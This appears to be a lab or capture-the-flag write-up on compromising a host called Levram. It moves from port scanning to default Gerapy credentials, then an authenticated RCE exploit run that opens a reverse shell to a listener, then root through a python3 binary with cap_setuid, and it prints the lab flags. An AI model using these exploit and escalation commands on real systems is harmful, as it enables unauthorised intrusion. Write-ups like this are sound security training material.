# Levram

## Enumeration & scanning

- Open ports are 22 and 8000.

``` sh
# Standard scanning
sudo nmap -p- 192.168.149.24        
sudo nmap -A 22,8000 192.168.149.24   
```

### 8000 (HTTP - Gerapy webapp)

- Gerapy webapp (scraper tool)
- Login screen: http://192.168.149.24:8000/#/login

``` sh
# Standard scanning
nuclei -target 192.168.149.24:8000
```

## Foothold

- Gerapy default credentials `admin:admin` can be used to login.
- Gerapy version is v0.9.7


## Exploitation

- Gerapy has an authenticated RCE exploit for this version: https://www.exploit-db.com/exploits/50640
- To make it work, first need to create a project with `admin` account
- Then get shell and local flag

``` sh
# Create project named 'test' in webapp with admin user
# Run exploit
python3 50640.py -t 192.168.149.24 -p 8000 -L 192.168.45.239 -P 4444
# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Get local flag
cd /home/app
cat local.txt
ce9ead58b8deb5bdf4c7201e18f6daf9
```

## Privilege Escalation

- Run Linpeas.
- Python3 binary has `cap_setuid=ep` capability set, meaning we can set it to `root` (https://gtfobins.org/gtfobins/python/). 

``` sh
# Check capabilities on binaries
getcap -r / 2>/dev/null
# Returns: /usr/bin/python3.10 cap_setuid=ep
# Run python shell as root
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Get flag
cd /root
cat proof.txt
fb1271159a6f34548ba79eabac077689
```


## References

- https://github.com/gerapy/gerapy
- https://www.exploit-db.com/exploits/50640
- https://gtfobins.org/gtfobins/python/


## Rabbit holes

- Multiple GTFObins binaries had SUID bit set (`pkexec`, `mount`). However, needed `app` user password to run anything `sudo`. 
- `sudo` version seems to be vulnerable but need `app` password to exploit (https://www.exploit-db.com/exploits/51217). 
